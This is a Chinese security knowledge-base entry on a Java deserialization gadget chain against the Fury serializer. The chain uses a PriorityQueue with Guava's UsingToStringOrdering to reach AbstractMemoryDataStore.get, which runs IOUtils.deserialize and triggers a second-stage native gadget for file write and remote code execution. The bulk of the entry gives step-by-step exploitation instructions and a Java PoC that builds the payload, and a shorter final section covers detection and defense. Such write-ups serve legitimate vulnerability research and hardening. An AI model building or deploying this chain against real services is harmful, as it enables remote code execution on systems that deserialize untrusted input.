---
id: web-java-deser-fury-usingtostring-datastore-ioUtils-secondary-deser
title: Fury 二次反序列化桥：UsingToStringOrdering→AbstractMemoryDataStore→IOUtils.deserialize 触发二阶段 gadget
type: scenario
domain: web
path: web/java/deserialization/comparator
technique: fury-usingtostring-datastore-ioUtils-secondary-deserialization
tags:
- java
- deserialization
- fury
- secondary-deserialization
- comparator
- usinttostringordering
- datastore
- ioutils
- gadget
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V157
  verified_at: '2026-11-06T07:39:06+08:00'
  notes: 已对照原文与图核对：UsingToStringOrdering.compare 调 toString（图14）、AbstractMemoryDataStore.toString→DataStoreUtils.toString→get（图15/16）、get 内 IOUtils.deserialize→ObjectInputStream.readObject（图18）、二阶段 BadAttributeValueExpException+TiedMapEntry+LazyMap+StoreableCachingMap 写入，与原文 PoC 一致。未在本机复跑。
url: /docs/web/java/deserialization/comparator/web-java-deser-fury-usingtostring-datastore-ioutils-secondary-deser/
draft: false
kb_aliases:
- Fury 二次反序列化
- IOUtils.deserialize 二次反序列化
- AbstractMemoryDataStore.get
- DataStoreUtils.toString
- UsingToStringOrdering.compare
- google-api-client 反序列化桥
---

## 一句话结论

Fury 反序列化不可信数据时，可用 `PriorityQueue` + `UsingToStringOrdering.compare` 触发元素的 `toString()`；`AbstractMemoryDataStore.toString()` 会委托 `DataStoreUtils.toString()` 遍历键并调用 `get(key)`，而 `AbstractMemoryDataStore.get()` 内部执行 `IOUtils.deserialize(byte[])`（即 `ObjectInputStream.readObject`），从而把 Fury 的第一次反序列化桥接成一次受攻击者控制的原生 Java 反序列化，执行二阶段 gadget。

## 原理

- **第一阶段触发点**：Fury 的 `CollectionSerializer` 重建 `PriorityQueue` 时调用 `add`/`heapify`，进而调用 comparator。`com.google.common.collect.UsingToStringOrdering.compare(left,right)` 的实现是 `left.toString().compareTo(right.toString())`，因此只要把可控对象放进队列，就能在反序列化阶段调用其 `toString()`。
- **toString→get 桥**：`com.google.api.client.util.store.AbstractMemoryDataStore.toString()` 直接 `return DataStoreUtils.toString(this)`；`DataStoreUtils.toString(DataStore)` 遍历 `dataStore.keySet()`，对每个 key 执行字符串拼接 `dataStore.get(key)`。因此 `toString()` 会触发 `AbstractMemoryDataStore.get(key)`。
- **get→二次反序列化**：`AbstractMemoryDataStore.get(String)` 的实现是 `return (V) IOUtils.deserialize(this.keyValueMap.get(str))`。`keyValueMap` 是 `Map<String, byte[]>`，`IOUtils.deserialize(byte[])` 内部 `new ObjectInputStream(new ByteArrayInputStream(bArr)).readObject()`。攻击者只要预先通过 `store.set(key, obj)` 让 `IOUtils.serialize` 把恶意对象序列化成字节存入 `keyValueMap`，之后 `get` 就会还原并执行该对象的 `readObject`。
- **为什么需要二次反序列化**：第一阶段受 Fury 序列化器与限制列表约束，某些二阶段 gadget（例如依赖普通 `Serializable` 与 `readObject` 的类）不能直接经 Fury 还原；借助 `IOUtils.deserialize` 切回 `ObjectInputStream`，即可复用经典原生反序列化 gadget，并绕过只针对 Fury 的类过滤。
- **文中二阶段选择**：不使用 `TransformingComparator`（Fury 用反序列化器还原对象，该 comparator 在该路径不可序列化/不可用），改用 `BadAttributeValueExpException` 作为入口：其 `readObject` 读取 `val` 字段并对 `TiedMapEntry` 调用 `toString()`，再走 `LazyMap.get → StoreableCachingMap.put` 完成文件写入/RCE。

## 触发条件

- 目标使用 Fury 反序列化攻击者可控数据，且允许任意类（如 `requireClassRegistration(false)`）。
- classpath 中存在 `com.google.api.client.util.store.AbstractMemoryDataStore`（常见于 Google API Client/GCP SDK 依赖）与 Guava `UsingToStringOrdering`。
- 攻击者能构造 `MemoryDataStoreFactory$MemoryDataStore` 实例并把恶意对象 `set` 进其 `keyValueMap`（序列化前完成，或利用可写入口）。
- 二阶段所需原生反序列化 gadget 类在 classpath 中，且没有被 JEP 290 等过滤器拦截。
- 第一阶段序列化过滤器未禁止 `PriorityQueue`、`UsingToStringOrdering`、`MemoryDataStore` 等桥接类。

## 利用步骤

1. 先构造二阶段对象：经典 `BadAttributeValueExpException` + `TiedMapEntry` + `LazyMap` + `StoreableCachingMap`（或其它原生 `readObject` gadget），用 `ObjectOutputStream` 序列化为字节，验证可独立触发。
2. 反射实例化 `MemoryDataStoreFactory$MemoryDataStore(MemoryDataStoreFactory, String)`，调用 `store.set("godown", 二阶段对象)`；`IOUtils.serialize` 会把对象存成 `keyValueMap` 中的 `byte[]`。
3. 取 `UsingToStringOrdering.INSTANCE`，构造 `PriorityQueue(2, ordering)`，反射把 `size` 置 2、`queue[0]=queue[1]=store`。
4. 用 Fury 序列化该 `PriorityQueue`，Base64 提交给目标。
5. 目标 `fury.deserialize` → `CollectionSerializer.read` → `PriorityQueue.add` → `UsingToStringOrdering.compare` → `store.toString` → `DataStoreUtils.toString` → `store.get` → `IOUtils.deserialize` → `ObjectInputStream.readObject` → 二阶段 gadget 执行。
6. 二阶段可用任意原生链（文中用 AspectJ StoreableCachingMap 写文件，进一步写 JRE jar 触发 RCE）。

## PoC

```java
// 1) 二阶段对象（示意）：BadAttributeValueExpException.val = TiedMapEntry
BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
Field val = BadAttributeValueExpException.class.getDeclaredField("val");
val.setAccessible(true);
val.set(bad, new TiedMapEntry(lazyMapOverStoreableCachingMap, "writeToPathFILE"));

// 2) 把二阶段对象存进 MemoryDataStore 的 byte[] map
MemoryDataStoreFactory f = MemoryDataStoreFactory.getDefaultInstance();
Class<?> c = Class.forName("com.google.api.client.util.store.MemoryDataStoreFactory$MemoryDataStore");
Constructor<?> ctor = c.getDeclaredConstructor(MemoryDataStoreFactory.class, String.class);
ctor.setAccessible(true);
AbstractMemoryDataStore store = (AbstractMemoryDataStore) ctor.newInstance(f, "my-store-id");
store.set("godown", bad);   // IOUtils.serialize -> keyValueMap["godown"] = bytes

// 3) 第一阶段：PriorityQueue + UsingToStringOrdering，两个元素都指向 store
Comparator<?> ordering = UsingToStringOrdering.INSTANCE;
PriorityQueue q = new PriorityQueue(2, ordering);
Field size = PriorityQueue.class.getDeclaredField("size"); size.setAccessible(true); size.set(q, 2);
Field queue = PriorityQueue.class.getDeclaredField("queue"); queue.setAccessible(true);
queue.set(q, new Object[]{store, store});

Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
byte[] payload = fury.serialize(q);   // Base64 后提交
```

## 变体与关联

- 变体：把 `UsingToStringOrdering` 换成其他会对元素调用 `toString` 的 comparator；把 `AbstractMemoryDataStore` 换成其他 `toString` 会遍历并 `get` 的 DataStore 实现。
- 变体：`FileDataStoreFactory$FileDataStore` 也使用 `IOUtils.deserialize` 读取本地文件；若能控制其数据文件，可形成文件写入→反序列化的另一条桥。
- 变体：二阶段可接任意原生 gadget，如 CommonsCollections、AspectJ 写文件、TemplatesImpl 等；文中的二阶段最终落到 JRE jar 写入。
- 关联：[[web-java-deser-fury-priorityqueue-aspectj-jre-jar-write-rce]]（第一阶段与文件写/RCE 主链）、[[web-java-deserialization-immutablesetmultimap-usingtostring-jsonarray-hsql]]（同为 `UsingToStringOrdering` 触发 `toString` 的桥）、[[web-java-deser-commonscollections-cc5-badattribute-tostring]]（二阶段 `BadAttributeValueExpException` 入口）。
- 边界：classpath 无 google-api-client store 类、`keyValueMap` 不可写入、Fury 类白名单禁止桥接类、JEP 290 过滤器拦截二阶段 gadget 时链不成立。

## 检测与防御

- Fury 配置：不可信输入必须开启类注册/白名单，禁止 `requireClassRegistration(false)`；将 `PriorityQueue`、`UsingToStringOrdering`、`MemoryDataStore` 等桥接类纳入禁止列表。
- 序列化防护：在 JVM 层启用 JEP 290 `ObjectInputFilter`，限制 `ObjectInputStream.readObject` 可还原的类，覆盖 `IOUtils.deserialize` 这类内部二次反序列化点。
- 依赖治理：不使用 Google API Client 的 DataStore 时移除相关依赖；保留时避免把不可信对象写入 DataStore。
- 检测：Fury 反序列化请求中出现 `PriorityQueue`/`UsingToStringOrdering`/`MemoryDataStore` 类描述；随后发生 `ObjectInputStream.readObject` 或二次反序列化调用；同一请求链出现文件写入 JRE 目录或命令执行。
- 响应：定位并还原被写入的文件，轮换受影响主机凭据，审计使用该反序列化入口的所有请求。
